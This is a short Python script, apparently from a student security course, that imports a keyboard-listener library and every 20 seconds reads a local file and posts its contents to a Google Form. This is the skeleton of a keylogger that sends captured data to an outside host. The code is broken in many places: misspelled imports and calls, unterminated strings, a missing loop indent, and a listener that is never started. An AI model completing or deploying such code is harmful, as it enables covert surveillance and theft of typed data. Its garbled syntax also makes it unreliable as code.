#!/usr/bin/env python3

import request
import time
import os
from pynput.keyboard import Listner

startlog = time.time()

os.system("python3 /home/student/ITP270_001N_FALL2022/)
time.sleep(1)

def send_request():
	form_input = open(/home/student/ITP270_001N_FALL2022)
	form_send = form_input.read() 
	url= 'https://docs.google.com/forms/u/1/d/e/1FAipQLSe-0wDfi5A0QP3Wh 
	form_data = {'entry.839337160': f"'{form_send}'"} 
	r = requests.post(url, data=form_data) 
	
def interval():
	global startlog
	if time.tome() - 20 > startlog:
		print('Its been 20 secs')
		send_request()
		startlog = time.time()
		
counter = 0
while True:
counter+= 1 
print(counter) 
interval() 
time.sleep(l)
